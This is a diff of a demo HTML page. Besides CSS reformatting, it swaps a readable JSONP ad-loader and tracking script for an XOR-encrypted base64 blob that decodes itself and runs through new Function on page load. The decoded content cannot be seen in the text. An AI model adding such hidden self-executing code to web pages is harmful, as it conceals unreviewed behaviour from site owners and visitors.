@@ -54,33 +54,32 @@
         }
 
         .article img {
-        max-width: 100%;
-        height: auto;
-        margin-bottom: 10px;
+          max-width: 100%;
+          height: auto;
+          margin-bottom: 10px;
         }
 
         .article p {
-        line-height: 1.6;
+          line-height: 1.6;
         }
 
         /* Ad container styling */
-        .ad-container {
-        margin-bottom: 20px;
-        padding: 10px;
-        background-color: red;
-        text-align: center;
-        border: 1px solid #ccc;
-        width: 100px;
-        height: 200px;
-        margin: 0 auto; /* Center the ad */
+        .adsContainer {
+          margin-bottom: 20px;
+          padding: 10px;
+          background-color: yellow;
+          text-align: center;
+          border: 1px solid #ccc;
+          width: 100%;
+          height: 100%;
+          margin: 0 auto;
         }
 
-        /* Ensure the ad (images, iframes, etc.) fits within the container */
-        .ad-container img, 
-        .ad-container iframe {
-        width: 100%;    /* Ensures the ad fits container width */
-        height: 100%;   /* Ensures the ad fits container height */
-        object-fit: cover; /* Ensures the content fills the space without distorting */
+        .adsContainer img, 
+        .adsContainer iframe {
+          width: 100%;
+          height: 100%;
+          object-fit: cover;
         }
 
     </style>
@@ -104,124 +103,34 @@
             <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
         </div>
 
-        <div class="ad-container">
-            <script>
+        <div class="adsContainer">
+          <script>
 
-                (function(){
-                  const d=document,
-                        _i="6783bf073c8431cf1d9f75f6",
-                        _b="http://localhost:5000/api", // Make URL configurable
-                        _t=5000;
-            
-                  const _l=()=>{
-                    const c=d.createElement("div");
-                    c.id=_i+"-ad";
-                    c.style.width = "100%";
-                    c.style.minHeight = "100px";
-                    
-                    let s=d.currentScript;
-                    if(!s){
-                      const scripts=d.getElementsByTagName("script");
-                      for(let i=0;i<scripts.length;i++){
-                        if(scripts[i].textContent.includes("6783bf073c8431cf1d9f75f6")){
-                          s=scripts[i];
-                          break;
-                        }
-                      }
-                    }
-                    
-                    if(s&&s.parentNode){
-                      s.parentNode.insertBefore(c,s);
-                    }else{
-                      d.body.appendChild(c);
-                    }
-                    c.innerHTML = '<div style="text-align: center; padding: 20px;">Loading ad...</div>';
-                    
-                    const l=d.createElement("script");
-                    const r="y"+Math.random().toString(36).substr(2,9);
-                    
-                    window[r]=h=>{
-                      if(!h||!h.html) {
-                        c.innerHTML = '<div style="text-align: center; padding: 20px;">No ads available</div>';
-                        return;
-                      }
-                      c.innerHTML=h.html;
-                      const a=[...c.getElementsByClassName("ad-container")];
-                      if(!a.length) {
-                        c.innerHTML = '<div style="text-align: center; padding: 20px;">Error loading ads</div>';
-                        return;
-                      }
-            
-                      a.forEach(e=>e.style.display="none");
-                      a[0].style.display="block";
-                      
-                      a.forEach(e=>{
-                        const link=e.querySelector('a');
-                        if(!link)return;
-                        const i=link.dataset.adId;
-                        
-                        // Modified view tracking
-                        const viewTracker = () => {
-                          fetch(_b+"/ads/view/"+i, {
-                            method: 'POST',
-                            mode: 'cors',
-                            credentials: 'omit'
-                          }).catch(console.error);
-                        };
-                        
-                        if(e.style.display !== "none") {
-                          viewTracker();
-                        }
-                        
-                        // Modified click tracking
-                        link.onclick=ev=>{
-                          ev.preventDefault();
-                          fetch(_b+"/ads/click/"+i, {
-                            method: 'POST',
-                            mode: 'cors',
-                            credentials: 'omit'
-                          })
-                          .then(() => window.open(link.href,'_blank'))
-                          .catch(() => window.open(link.href,'_blank'));
-                          return false;
-                        };
-                      });
-            
-                      if(a.length>1) {
-                        let x=0;
-                        setInterval(()=>{
-                          a[x].style.display="none";
-                          x=(x+1)%a.length;
-                          a[x].style.display="block";
-                          const link=a[x].querySelector('a');
-                          if(link) {
-                            const i=link.dataset.adId;
-                            fetch(_b+"/ads/view/"+i, {
-                              method: 'POST',
-                              mode: 'cors',
-                              credentials: 'omit'
-                            }).catch(console.error);
-                          }
-                        },_t);
-                      }
-                      delete window[r];
-                    };
-                    
-                    l.src=_b+"/ads/display?categoryId="+_i+"&callback="+r;
-                    l.onerror = () => {
-                      c.innerHTML = '<div style="text-align: center; padding: 20px;">Failed to load ad content</div>';
-                    };
-                    d.body.appendChild(l);
-                  };
-            
-                  if(d.readyState==="loading"){
-                    d.addEventListener("DOMContentLoaded",_l);
-                  }else{
-                    _l();
-                  }
-                })();
+            (function(){
+              const _k='Kj916Sn07YEumgA5MDiHX/vZhstxilNsBENfOiplwb8=';
+              const _d='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';
               
-            </script>
+              const _dec=(str,key)=>{
+                const decoded=atob(str);
+                let result='';
+                for(let i=0;i<decoded.length;i++){
+                  const keyChar=key.charCodeAt(i%key.length);
+                  const strChar=decoded.charCodeAt(i);
+                  result+=String.fromCharCode(strChar^keyChar);
+                }
+                return result;
+              };
+        
+              try {
+                const script=_dec(_d,_k);
+                const f=new Function(script);
+                f();
+              } catch(e) {
+                console.error('Ad script initialization error:',e);
+              }
+            })();
+          
+        </script>
         </div>
 
     </body>
